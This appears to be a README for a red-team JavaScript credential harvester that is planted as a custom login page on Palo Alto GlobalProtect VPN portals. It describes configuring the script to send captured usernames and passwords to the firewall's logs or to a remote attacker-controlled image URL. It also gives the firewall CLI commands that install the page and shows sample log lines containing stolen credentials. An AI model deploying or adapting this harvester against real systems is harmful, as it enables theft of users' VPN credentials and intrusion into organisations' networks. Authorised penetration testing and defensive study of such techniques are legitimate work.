# Palo Alto Network Firewall Response Pages Login Credential Harvester

This project is a javascript gadget that red-teamers can use to harvest
credentials from users signing in to GlobalProtect Portals and Clientless VPN.

The gadget operates in two modes, `local` and `remote`, and installs an event
listener that intercepts the successful login form submissions and sends the
user credentials to either local URL path on the firewall or a remote web site.

The web access logs on the local firewall or remote server can then be searched
for the requests containing the credentials.

## Configuration

The `harvester` response page script requires some editing and configuration
before using.

Near the top of the page are three variables:

```javascript
            const method = "local"; // Change this to "local" to send to firewall logs
            const token = "qwerty"; // Change this to a unique value
            var remoteUrl = "<image url>"; // An image, 1x1 pixel PNG, hosted on a server that you control.
```

- `method` controls whether the script sends the request to the `local` firewall
  GlobalProtect web server or to a `remote` server.
- `token` should be set to a unique value, e.g. a per campaign identifier, to
  make it easier to search the logs.
- `remoteUrl` is a URL to an image file hosted on a server that you control and
  have access to the access logs.
  We recommend this [1x1.png](https://en.m.wikipedia.org/wiki/File:1x1.png).
  The `remoteUrl` is used with the `remote` method.
  The `remoteUrl` must return an image file (gif, jpeg, png, svg, etc).

## Installation

After configuring the response page you can load it into the firewall with this
command:

```
# set shared response-page global-protect-portal-custom-login-page <harvester name> page <base64 encoded harvester>
# set global-protect global-protect-portal <portal name> portal-config custom-login-page <harvester name>
# commit
```

## Usage

The `harvester` currently only supports harvesting credentials for the
`GlobalProtect Portal Login Page` response page.

There are two use cases where the credentials for users signing in can be
captured:

1. Users signing in to the GlobalProtect Portal to download the GlobalProtect
   VPN agent client software.
2. Users signing in to the GlobalProtect Portal to connect to the Clientless VPN
   (aka SSL VPN) portal.

In most environments the first case will be infrequently used as they will
distribute the client to their endpoints via their endpoint management platform.
Target environments are more likely to leave this enabled for managed service
providers and contractors to be able to download and install the VPN client on
their own computers.

The second case, if in use, will be more likely to gather credentials as the
users may have more need to connect to the Clientless VPN to access the
applications it provides access to.

### Credentials logs

The credentials will be in the access logs of the `remote` web server.
Easiest way to find them is to search for the `token` value you configured.

They will remote logs will look something like this:

```
1.2.3.4 - - [18/Jan/2025:20:49:34 -0800] "GET /gpvpn/logo.png?token=qwerty&username=alice&password=letmein123&nc=0.7448065807029041 HTTP/2.0" 200 241 "https://gpvpn.victim.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
```

The `local` method credentials can be found in the SSL VPN access logs.
These are only available via the CLI or tech support file.

To view them on the CLI SSH to the firewall and run:

```
less webserver-log sslvpn_access.log
```

Then type `/`, type the token value and press enter to search.
Type `/` and enter again to repeat the search.

From the CLI you can generate and download the tech support file using the
commands:

```
scp export tech-support to user@host.domain:/directory/to/save
```

The access log can be found in `/var/log/nginx/sslvpn_access.log` in the tech
support tar.gz file.

The local logs will look like this:

```
1.2.3.4 54583 - 172.16.1.4 20077 [19/Jan/2025:00:44:13 -0800] "GET /global-protect/portal/images/logo-pan-48525a.svg?token=qwerty&username=alice&password=letmein123&nc=0.4744690309853232 HTTP/1.1" 200 12316 "https://gpvpn.victim.com/global-protect/login.esp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" 1737276253.465 0.000 - 1510
```
## To Do

Develop gadgets for the `Captive Portal Comfort Page` and `MFA Login Page`.
